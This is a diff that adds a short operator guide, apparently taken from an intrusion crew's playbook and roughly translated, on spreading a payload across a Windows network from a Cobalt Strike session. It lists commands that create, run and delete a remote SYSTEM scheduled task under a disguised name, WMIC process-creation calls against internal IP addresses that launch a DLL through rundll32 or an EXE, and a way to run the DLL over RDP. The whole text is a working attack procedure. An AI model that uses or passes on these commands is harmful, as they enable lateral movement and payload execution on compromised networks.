@@ -1,0 +1,30 @@
+Commands to run payload, to pull up the session in cobalt
+1) shell SCHTASKS /s MS040926754153 /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\P32.exe" /sc ONCE /sd 01/01/1970 /st 00:00
+2) shell SCHTASKS /s MS040926754153 /run /TN "WindowsSensor15"
+3) shell schtasks /S MS040926754153 /TN "WindowsSensor15" /DELETE /F
+instead of
+MS040926754153
+put in
+still points
+run through the commands one at a time
+1) creating a ride with payload
+2) turn on
+3) deleting
+
+
+Run VMICOM, we use it more often.
+1) if it's a dll, then
+shell wmic /node:192.168.104.13 process call create "rundll32.exe C:\ProgramData\x64.dll StartW"
+
+Accordingly, where the IP address, we put the IP address of the machine we have access to, then comes the path and the name of our dll, I think the syntax is clear
+
+If you are on RDP > open CMD as administrator and rundll32.exe C:\ProgramData\x64.dll,StartW you can define any path, according to where your dll is
+
+
+For EXE or .bat format you can run VMICOM as follows
+
+shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"
+
+
+
+You can also load and run via metasploit, but we rarely use this tool now, because it is not working correctly in the latest version
